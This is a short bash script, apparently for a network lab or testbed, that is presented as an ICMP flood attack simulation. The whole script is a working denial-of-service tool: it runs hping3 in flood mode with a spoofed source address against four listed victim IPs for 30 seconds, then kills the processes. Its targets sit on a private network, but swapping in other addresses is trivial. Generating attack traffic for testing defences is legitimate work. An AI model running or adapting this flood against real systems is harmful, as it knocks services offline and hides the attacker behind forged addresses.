#!/bin/bash
# attack_generator.sh - simulate ICMP flood jamming attack

VICTIMS=("10.0.1.1" "10.0.1.2" "10.0.1.3" "10.0.1.4")
ATTACKER_IP="10.0.1.100"
DURATION=30  # seconds

echo "Starting ICMP flood attack simulation..."

for ip in "${VICTIMS[@]}"
do
  echo "Flooding $ip from $ATTACKER_IP"
  hping3 --icmp --flood -a $ATTACKER_IP $ip > /dev/null 2>&1 &
done

sleep $DURATION

killall hping3

echo "Attack simulation finished."
